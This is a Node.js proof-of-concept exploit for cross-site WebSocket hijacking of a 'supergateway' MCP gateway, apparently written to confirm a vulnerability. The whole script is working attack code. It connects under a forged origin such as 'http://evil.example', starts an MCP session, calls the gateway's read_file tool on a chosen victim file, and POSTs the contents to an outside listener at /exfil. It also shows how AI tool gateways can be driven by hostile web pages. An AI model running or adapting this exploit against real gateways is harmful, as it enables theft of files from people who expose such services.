// CSWSH PoC: any web origin can drive a supergateway WebSocket MCP gateway.
// Usage: node cswsh_ws_poc.js <ws-url> <victim-file> <listener-url> [origin]
// Exit: 0 = file content exfiltrated and delivered; 1 = wrong/failed; 2 = upgrade refused; 3 = timeout.
const WebSocket = require('ws');
const fs = require('fs');
const [url, victimFile, listener, origin = 'http://evil.example'] = process.argv.slice(2);
if (!url || !victimFile || !listener) { console.error('usage: node cswsh_ws_poc.js <ws-url> <victim-file> <listener-url> [origin]'); process.exit(2); }
const expected = fs.readFileSync(victimFile, 'utf8').trim();
const auth = process.env.SGAUTH ? { Authorization: process.env.SGAUTH } : {};
const ws = new WebSocket(url, { headers: { Origin: origin, ...auth } });
let phase = 'init';
const fail = (why) => { console.error('[-]', why); process.exit(1); };
ws.on('open', () => {
  console.log('[+] upgrade accepted for Origin', origin);
  ws.send(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2024-11-05', capabilities: {}, clientInfo: { name: 'evil-page', version: '1.0' } } }));
});
ws.on('message', (d) => {
  const msg = JSON.parse(d.toString());
  if (phase === 'init' && msg.id === 1) {
    phase = 'call';
    ws.send(JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }));
    ws.send(JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'read_file', arguments: { path: victimFile } } }));
  } else if (phase === 'call' && msg.id === 2) {
    const text = (msg.result?.content?.[0]?.text ?? '').trim();
    if (text !== expected) fail('tool returned unexpected content: ' + JSON.stringify(text));
    console.log('[+] EXFILTRATED VICTIM FILE CONTENT:', text);
    fs.writeFileSync('cswsh_proof.txt', text + '\n');
    fetch(listener + '/exfil', { method: 'POST', headers: { 'content-type': 'text/plain' }, body: `CSWSH ${url} origin=${origin} -> ${text}\n` })
      .then(async (r) => {
        if (r.status !== 200) fail('listener status ' + r.status);
        console.log('[+] proof delivered to listener (HTTP 200)');
        ws.close(); setTimeout(() => process.exit(0), 200);
      })
      .catch((e) => fail('listener error: ' + e.message));
  }
});
ws.on('unexpected-response', (_req, res) => { console.error('[-] upgrade refused:', res.statusCode); process.exit(2); });
ws.on('error', (e) => { console.error('[-] ws error:', e.message); process.exit(2); });
setTimeout(() => { console.error('[-] timeout'); process.exit(3); }, 20000);
